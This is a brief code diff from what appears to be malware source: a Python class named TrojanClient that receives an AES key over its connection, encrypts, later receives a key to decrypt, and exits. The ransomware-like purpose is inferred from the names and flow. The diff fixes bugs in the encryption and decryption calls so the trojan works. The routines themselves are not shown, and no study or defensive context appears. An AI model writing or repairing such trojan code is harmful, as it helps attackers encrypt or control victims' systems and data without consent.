@@ -156,7 +156,7 @@ class TrojanClient:
         aes_key = protocol.receive(self.connection)
         
         # encryption
-        self.encryption(self, aes_key)
+        self.encryption(aes_key)
         
         msg = protocol.receive(self.connection)
         msg_decode = msg.decode()
@@ -166,7 +166,7 @@ class TrojanClient:
         aes_key = protocol.receive(self.connection)
 
         #decrepption
-        self.decryption(self, aes_key)
+        self.decryption(aes_key)
         
         sys.exit()
 
